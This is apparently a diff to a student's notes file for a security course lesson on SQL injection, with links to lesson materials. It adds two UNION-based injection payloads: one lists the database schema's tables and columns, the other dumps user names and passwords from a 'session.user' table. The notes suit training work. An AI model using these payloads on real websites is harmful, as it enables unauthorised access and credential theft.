@@ -4,5 +4,7 @@ STUDENT FG: https://sec.cybbh.io/public/security/latest/lessons/lesson-5-sql_sg.
 STUDENT SLIDES: https://sec.cybbh.io/-/public/-/jobs/842473/artifacts/slides/05-sql-injection-slides.html
 ----------------------------------------------------------------------------------------------------
 GENERAL INFO
+Audi' UNION select table_schema,2,table,table_name,column_name,5 FROM information_schema.columns WHERE table_schema='session';#
+Audi' UNION select id,2,name,pass,5 from session.user;#
 ----------------------------------------------------------------------------------------------------
 
